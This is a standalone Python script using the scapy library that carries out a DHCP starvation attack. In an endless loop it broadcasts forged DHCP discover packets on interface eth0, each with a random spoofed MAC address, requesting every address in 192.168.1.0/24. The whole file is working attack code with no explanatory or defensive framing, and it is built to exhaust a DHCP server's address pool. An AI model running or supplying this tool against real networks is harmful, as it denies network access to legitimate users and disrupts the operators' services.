import time 
import scapy.all as scapy
from scapy.all import Ether, IP, UDP, BOOTP, DHCP, sendp, RandMAC, conf
from time import sleep
import ipaddress
import platform
import sys 
import os 

def main():
    if sys.platform == 'win32':
        os.system("cls")
    if sys.platform == 'linux':
        os.system("clear")
        while True:

            conf.checkIPaddr = False
            possible_ips = [str(ip) for ip in ipaddress.IPv4Network('192.168.1.0/24')]

            for ip_add in possible_ips:
                bog_src_mac = RandMAC()
                broadcast = Ether(src=bog_src_mac, dst="ff:ff:ff:ff:ff:ff")
                ip = IP(src="0.0.0.0", dst="255.255.255.255")
                udp = UDP(sport=68, dport=67)
                bootp = BOOTP(op=1,chaddr = bog_src_mac)
                dhcp = DHCP(options=[("message-type", "discover"), ("requested_addr", ip_add), ("server-id", "192.168.1.249"), ('end')])
                pkt = broadcast / ip / udp / bootp / dhcp
                sendp(pkt,iface='eth0', verbose=0)
                print(f"Allocating host DHCP ~~> {ip_add} Using ~~> {bog_src_mac} ")

if __name__ == "__main__":
    main()